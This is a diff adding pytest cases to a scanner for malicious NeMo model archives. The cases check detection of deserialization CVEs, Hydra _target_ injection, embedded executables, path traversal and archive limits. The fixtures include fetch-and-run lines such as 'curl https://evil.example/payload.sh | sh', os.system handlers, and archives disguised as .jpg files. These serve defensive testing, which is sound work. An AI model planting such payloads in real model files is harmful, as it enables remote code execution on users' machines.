@@ -20,6 +20,7 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.nemo_scanner import NemoScanner, _get_nested_scanner_for_file
+from modelaudit.utils.file import detection as file_detection
 
 
 def _create_nemo_file_from_bytes(
@@ -220,6 +221,42 @@ class TestNemoArchiveVulnerabilityCoverage:
         assert "CVE-2026-24157" in details["related_cves"]
         assert details["nested_scanner"] == "pickle"
 
+    def test_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
+        nemo_path = tmp_path / "torch7-checkpoint-rce.nemo"
+        torch7_payload = (
+            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
+
+        result = NemoScanner().scan(str(nemo_path))
+
+        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
+        assert len(cve_checks) == 1
+        assert cve_checks[0].severity == IssueSeverity.CRITICAL
+        assert cve_checks[0].details["nested_scanner"] == "torch7"
+
+    def test_marker_form_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(
+        self, tmp_path: Path
+    ) -> None:
+        nemo_path = tmp_path / "marker-torch7-checkpoint-rce.nemo"
+        torch7_payload = (
+            b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"
+        )
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
+
+        result = NemoScanner().scan(str(nemo_path))
+
+        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
+        assert len(cve_checks) == 1
+        assert cve_checks[0].severity == IssueSeverity.CRITICAL
+        assert cve_checks[0].details["nested_scanner"] == "torch7"
+
     def test_symlink_checkpoint_alias_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-symlink-alias.nemo"
         with tarfile.open(nemo_path, "w") as tar:
@@ -357,6 +394,45 @@ class TestNemoArchiveVulnerabilityCoverage:
         assert len(checks) == 1
         assert checks[0].status == CheckStatus.FAILED
         assert checks[0].details["entry"] == "assets/payload.jpg"
+
+    def test_renamed_nemo_embedded_pe_after_short_prefix_is_detected(self, tmp_path: Path) -> None:
+        payload = bytearray(b"MZ" + (b"\0" * (8192 + 4 - 2)))
+        payload[0x3C:0x40] = (8192).to_bytes(4, "little")
+        payload[8192:8196] = b"PE\0\0"
+        nemo_path = tmp_path / "embedded-pe.jpg"
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+            _add_tar_bytes(tar, "assets/payload.jpg", bytes(payload))
+
+        result = scan_file(str(nemo_path), config={"cache_scan_results": False})
+
+        assert result.scanner_name == "nemo"
+        assert any(
+            check.name == "Executable Archive Member Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details["entry"] == "assets/payload.jpg"
+            for check in result.checks
+        )
+
+    def test_renamed_nemo_retains_recursive_tar_scanning_for_unreferenced_archive(self, tmp_path: Path) -> None:
+        nested_archive = io.BytesIO()
+        with zipfile.ZipFile(nested_archive, "w") as archive:
+            archive.writestr("handler.py", b"import os\nos.system('echo hidden')\n")
+
+        nemo_path = tmp_path / "nested-bundle.jpg"
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+            _add_tar_bytes(tar, "assets/bundle.zip", nested_archive.getvalue())
+
+        result = scan_file(str(nemo_path), config={"cache_scan_results": False})
+
+        assert result.scanner_name == "nemo"
+        assert any(
+            check.name == "Python Archive Member Security"
+            and check.status == CheckStatus.FAILED
+            and "assets/bundle.zip" in str(check.location)
+            for check in result.checks
+        )
 
     def test_benign_embedded_python_member_does_not_create_security_finding(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "benign-handler.nemo"
@@ -529,6 +605,34 @@ class TestNemoArchiveVulnerabilityCoverage:
         assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
         assert "scan_outcome" not in result.metadata
 
+    def test_metadata_referenced_torchserve_finding_is_not_deserialization_cve(self, tmp_path: Path) -> None:
+        nemo_path = tmp_path / "referenced-torchserve.nemo"
+        config = {
+            "model": {"_target_": "nemo.Model"},
+            "handler": "nemo:artifacts/handler.mar",
+        }
+        mar_payload = io.BytesIO()
+        with zipfile.ZipFile(mar_payload, "w") as archive:
+            archive.writestr(
+                "MAR-INF/MANIFEST.json",
+                '{"model":{"serializedFile":"weights.bin","handler":"handler.py"}}',
+            )
+            archive.writestr("weights.bin", b"weights")
+            archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
+        with tarfile.open(nemo_path, "w") as tar:
+            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+            _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())
+
+        result = NemoScanner().scan(str(nemo_path))
+
+        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
+        assert any(
+            "Handler contains high-risk execution primitives" in check.message
+            and check.status == CheckStatus.FAILED
+            and check.severity == IssueSeverity.CRITICAL
+            for check in result.checks
+        )
+
     def test_nested_checkpoint_archive_traversal_not_labeled_deserialization_cve(self, tmp_path: Path) -> None:
         nested_checkpoint = io.BytesIO()
         with zipfile.ZipFile(nested_checkpoint, "w") as zipf:
@@ -542,6 +646,53 @@ class TestNemoArchiveVulnerabilityCoverage:
         result = NemoScanner().scan(str(nemo_path))
 
         assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
+        assert any(
+            check.name == "Path Traversal Protection"
+            and check.status == CheckStatus.FAILED
+            and check.severity == IssueSeverity.CRITICAL
+            for check in result.checks
+        )
+
+    def test_promoted_nemo_nested_tar_retains_entry_limit(self, tmp_path: Path) -> None:
+        nested_tar = io.BytesIO()
+        with tarfile.open(fileobj=nested_tar, mode="w") as archive:
+            _add_tar_bytes(archive, "one.bin", b"one")
+            _add_tar_bytes(archive, "two.bin", b"two")
+            _add_tar_bytes(archive, "three.bin", b"three")
+
+        path = tmp_path / "nested-limit.jpg"
+        with tarfile.open(path, "w") as archive:
+            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+            _add_tar_bytes(archive, "assets/bundle.tar", nested_tar.getvalue())
+
+        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 2})
+
+        assert result.scanner_name == "nemo"
+        assert result.success is False
+        assert any(
+            check.name == "Entry Count Limit Check"
+            and check.status == CheckStatus.FAILED
+            and check.details["entries"] == 3
+            for check in result.checks
+        )
+
+    def test_promoted_nested_nemo_obeys_tar_depth_limit(self, tmp_path: Path) -> None:
+        nested_nemo = _create_nemo_file(
+            tmp_path,
+            {"model": {"_target_": "os.system", "command": "echo pwned"}},
+            filename="inner.jpg",
+        )
+        path = tmp_path / "outer.tar"
+        with tarfile.open(path, "w") as archive:
+            archive.add(nested_nemo, arcname="inner.jpg")
+
+        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_depth": 1})
+
+        assert result.scanner_name == "tar"
+        assert any(
+            check.name == "TAR Depth Bomb Protection" and check.status == CheckStatus.FAILED for check in result.checks
+        )
+        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)
 
 
 @pytest.mark.skipif(not HAS_YAML, reason="PyYAML not installed")
@@ -612,6 +763,70 @@ class TestCVE202523304HydraTarget:
     def test_core_routes_gzip_wrapped_renamed_nemo_archive(self, tmp_path: Path) -> None:
         path = tmp_path / "compressed.jpg"
         with tarfile.open(path, "w:gz") as archive:
+            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
+
+        result = scan_file(str(path), config={"cache_scan_results": False})
+
+        assert result.scanner_name == "nemo"
+        assert any(
+            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+            and check.status == CheckStatus.FAILED
+            and check.details["target"] == "os.system"
+            for check in result.checks
+        )
+
+    def test_renamed_nemo_root_config_within_route_budget_is_scanned(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 3)
+        path = tmp_path / "late-config.jpg"
+        with tarfile.open(path, "w") as archive:
+            _add_tar_bytes(archive, "assets/one.bin", b"one")
+            _add_tar_bytes(archive, "assets/two.bin", b"two")
+            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
+
+        result = scan_file(str(path), config={"cache_scan_results": False})
+
+        assert result.scanner_name == "nemo"
+        assert any(
+            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+            and check.status == CheckStatus.FAILED
+            and check.details["target"] == "os.system"
+            for check in result.checks
+        )
+
+    def test_renamed_tar_over_route_budget_fails_closed_without_nemo_promotion(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
+        path = tmp_path / "large-generic.jpg"
+        with tarfile.open(path, "w") as archive:
+            _add_tar_bytes(archive, "assets/one.bin", b"one")
+            _add_tar_bytes(archive, "assets/two.bin", b"two")
+            _add_tar_bytes(archive, "deployment.yaml", b"model:\n  _target_: os.system\n")
+
+        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 100})
+
+        assert result.scanner_name == "unknown"
+        assert result.success is False
+        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+        assert "nemo_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)
+
+    def test_declared_nemo_scans_root_config_beyond_renamed_route_budget(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
+        path = tmp_path / "declared.nemo"
+        with tarfile.open(path, "w") as archive:
+            _add_tar_bytes(archive, "assets/one.bin", b"one")
+            _add_tar_bytes(archive, "assets/two.bin", b"two")
             _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
 
         result = scan_file(str(path), config={"cache_scan_results": False})
